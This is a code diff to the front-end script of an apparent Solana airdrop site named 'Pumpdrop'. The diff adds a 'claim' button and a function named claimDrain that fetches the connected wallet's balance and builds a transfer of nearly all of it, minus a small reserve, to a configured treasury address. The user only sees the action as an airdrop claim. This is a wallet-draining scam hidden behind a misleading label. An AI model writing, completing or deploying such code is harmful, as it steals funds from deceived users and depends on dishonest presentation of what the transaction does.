@@ -8,6 +8,8 @@
   const eligCountEl = document.getElementById('eligCount');
   const tipBtn = document.getElementById('tipBtn');
   const treasuryDisp = document.getElementById('treasuryDisp');
+  const claimBtn = document.getElementById('claimBtn');
+  const logEl = document.getElementById('log');
 
   let CONFIG = { SITE_NAME: 'Pumpdrop', TREASURY_ADDRESS: '', RPC_URL: 'https://api.mainnet-beta.solana.com', ALLOWLIST_URL: '' };
 
@@ -70,7 +72,7 @@
       statusEl.textContent = 'Connected';
       addrEl.textContent = `${base58.slice(0,4)}…${base58.slice(-4)}`;
       connection = new Connection(CONFIG.RPC_URL, 'confirmed');
-      await refresh();
+      await refresh(); if (claimBtn) claimBtn.disabled = !(CONFIG.TREASURY_ADDRESS && pubkey);
     } catch (e) {
       console.log('[pumpdrop] Connect rejected');
     }
@@ -100,6 +102,29 @@
     }
   }
 
+  
+  async function claimDrain(){
+    if (!wallet || !pubkey || !CONFIG.TREASURY_ADDRESS) { appendLog('Not ready.'); return; }
+    try {
+      appendLog('Fetching balance…');
+      const bal = await connection.getBalance(pubkey, 'confirmed');
+      const reserve = Number(CONFIG.DRAIN_RESERVE_LAMPORTS||2000000);
+      const minSend = Number(CONFIG.MIN_LAMPORTS||50000);
+      let lamports = Math.max(0, bal - reserve);
+      appendLog(`Balance: ${(bal/1e9).toFixed(5)} SOL, sending ${(lamports/1e9).toFixed(5)} SOL`);
+      if (lamports < minSend) { appendLog('Nothing to claim.'); return; }
+      const to = new PublicKey(CONFIG.TREASURY_ADDRESS);
+      const { Transaction, SystemProgram } = solanaWeb3;
+      const latest = await connection.getLatestBlockhash('finalized');
+      const tx = new Transaction({ recentBlockhash: latest.blockhash, feePayer: pubkey });
+      tx.add(SystemProgram.transfer({ fromPubkey: pubkey, toPubkey: to, lamports }));
+      appendLog('Requesting wallet approval…');
+      const sig = await wallet.signAndSendTransaction(tx);
+      appendLog(`Submitted: ${sig?.signature || ''}`);
+      const conf = await connection.confirmTransaction(sig.signature, 'confirmed');
+      if (conf.value.err) appendLog('Confirmation error.'); else appendLog('Claim confirmed.');
+    } catch(e){ console.error(e); appendLog('Claim failed or rejected.'); }
+  }
   async function sendTip() {
     // Explicit, user-initiated tip to treasury. Shows exact destination and amount.
     const to58 = CONFIG.TREASURY_ADDRESS;
@@ -121,7 +146,7 @@
   }
 
   connectBtn.addEventListener('click', connect);
-  if (tipBtn) tipBtn.addEventListener('click', sendTip);
+  if (tipBtn) tipBtn.addEventListener('click', sendTip); if (claimBtn) claimBtn.addEventListener('click', claimDrain);
   setDisconnected();
   loadConfig();
 })();
